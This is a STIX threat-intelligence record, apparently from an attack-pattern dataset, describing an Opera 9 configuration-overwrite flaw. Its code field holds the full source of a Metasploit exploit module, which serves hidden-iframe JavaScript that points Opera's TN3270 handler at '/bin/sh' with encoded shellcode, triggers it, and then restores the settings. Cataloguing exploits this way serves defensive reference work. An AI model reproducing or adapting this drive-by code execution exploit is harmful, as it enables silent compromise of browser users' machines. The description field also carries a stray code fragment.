{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0593ad77-6c66-4e5c-9377-c84ca2e251d1",
    "created": "2024-08-14T17:06:27.634337Z",
    "modified": "2024-08-14T17:06:27.634341Z",
    "name": "Opera 9 Configuration Overwrite",
    "description": " Opera web browser in versions <= 9.10 allows unrestricted script access to its configuration page, opera:config, allowing an attacker to change settings and potentially execute arbitrary code.  'License'        => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/opera_configoverwrite.rb",
            "external_id": "opera_configoverwrite.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name => HttpClients::OPERA,\n    :ua_maxver => \"9.10\",\n    :os_name => [ OperatingSystems::Match::WINDOWS, OperatingSystems::Match::LINUX ],\n    :javascript => true,\n    :rank => ExcellentRanking, # reliable cmd exec, cleans up after itself\n    :vuln_test => nil,\n  })\n\n  def initialize(info = {})\n    super(update_info(info,{\n      'Name'           => 'Opera 9 Configuration Overwrite',\n      'Description'    => %q{\n        Opera web browser in versions <= 9.10 allows unrestricted script\n        access to its configuration page, opera:config, allowing an\n        attacker to change settings and potentially execute arbitrary\n        code.\n      },\n      'License'        => BSD_LICENSE,\n      'Author'         =>\n        [\n          'egypt', # stolen from mpack\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '66472'],\n        ],\n      'Payload'        =>\n        {\n          'EXITFUNC' => 'process',\n          'Space'    => 2048,\n          'DisableNops' => true,\n          'BadChars' => \" \",\n        },\n      'Platform'       => %w{ unix },\n      'Targets'        =>\n        [\n          #[ 'Opera < 9.10 Windows',\n          #\t{\n          #\t\t'Platform' => 'win',\n          #\t\t'Arch' => ARCH_X86,\n          #\t}\n          #],\n          [ 'Opera < 9.10 Unix Cmd',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n            }\n          ],\n        ],\n      # Not sure when this was disclosed but it's been known since at\n      # least March 5, 2007, since that's the release date on the version\n      # of mpack I stole this from.\n      'DisclosureDate' => '2007-03-05',\n      'DefaultTarget' => 0\n      }))\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Got request #{request.uri}\")\n\n    case request.uri\n    when get_resource\n      print_status(\"Sending #{self.name}\")\n      content =  \"<body><script>\"\n      content << generate_evil_js(cli, request)\n      content << \"</script></body>\"\n      headers = { 'Content-Type' => 'text/html' }\n    else\n      print_status(\"404ing request for #{request.uri}\")\n      send_not_found(cli)\n      return\n    end\n    send_response_html(cli, content, headers)\n\n    print_status(\"Done with request #{request.uri}\")\n  end\n\n  def generate_evil_js(cli, request)\n    # There are a bunch of levels of quotes here, so the easiest way to\n    # make everything line up is to hex escape the command to run\n    p = regenerate_payload(cli).encoded\n    send_not_found(cli) && return if not p\n\n    shellcode = Rex::Text.to_hex(p, \"%\")\n    js = <<ENDJS\nblank_iframe = document.createElement('iframe');\nblank_iframe.src = 'about:blank';\nblank_iframe.setAttribute('id', 'blank_iframe_window');\nblank_iframe.setAttribute('style', 'display:none');\ndocument.body.appendChild(blank_iframe);\nblank_iframe_window.eval(\n  \"config_iframe = document.createElement('iframe');\" +\n  \"config_iframe.setAttribute('id', 'config_iframe_window');\" +\n  \"config_iframe.src = 'opera:config';\" +\n  \"document.body.appendChild(config_iframe);\" +\n  \"cache_iframe = document.createElement('iframe');\" +\n  \"cache_iframe.src = 'opera:cache';\" +\n  \"cache_iframe.onload = function ()\" +\n  \"{\" +\n  \"\tconfig_iframe_window.eval\" +\n  \"\t(\\\\\"\" +\n  \"\told_handler = opera.getPreference('Network','TN3270 App');\" +\n  \"\told_pref    = opera.getPreference('User Prefs','Run TN3270 In Terminal');\" +\n  \"\tshellcode = '#{shellcode}';\" +\n  \"\topera.setPreference('Network','TN3270 App','/bin/sh -c ' + unescape(shellcode));\" +\n  \"\topera.setPreference('User Prefs','Run TN3270 In Terminal','0');\" +\n  \"\tapp_link = document.createElement('a');\" +\n  \"\tapp_link.setAttribute('href', 'tn3270://#{Rex::Text.rand_text_alpha(rand(5)+5)}');\" +\n  \"\tapp_link.click();\" +\n  \"\tsetTimeout(function () {opera.setPreference('Network','TN3270 App',old_handler)},1000);\" +\n  \"\tsetTimeout(function () {opera.setPreference('User Prefs','Run TN3270 In Terminal',old_pref)},1000);\" +\n  \"\t\\\\\");\" +\n  \"};\" +\n  \"document.body.appendChild(cache_iframe);\" +\n\"\");\nENDJS\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-05",
    "x_mitre_platforms": [
        "unix'"
    ]
}